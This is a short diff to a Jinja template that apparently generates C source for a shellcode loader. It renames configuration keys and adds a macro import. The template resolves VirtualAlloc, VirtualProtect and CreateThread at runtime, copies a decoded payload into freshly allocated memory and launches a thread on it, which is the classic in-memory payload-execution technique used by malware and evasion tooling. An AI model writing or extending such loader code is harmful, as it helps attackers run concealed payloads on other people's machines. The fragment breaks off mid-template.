@@ -1,5 +1,7 @@
+{% from "macros.jinja" import function_typedef, function_definition, createThreadStub with context %}
+
 {% if section == "globals" %}
-    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
+    {% if link.functions.value in ["dynamic", "direct"] %}
         {{ function_typedef("VirtualAlloc") }}
         {{ function_typedef("VirtualProtect") }}
         {{ function_typedef("CreateThread") }}
@@ -9,7 +11,7 @@
         {{ function_definition("VirtualAlloc") }}
         {{ function_definition("VirtualProtect") }}
 
-        {% if link.alloc.protection == "rx" %}
+        {% if protection == "rx" %}
             VOID *mem = pVirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_READWRITE);
             memcpy(mem, decoded, length);
             {{ createThreadStub("local", "mem", "mem") }}
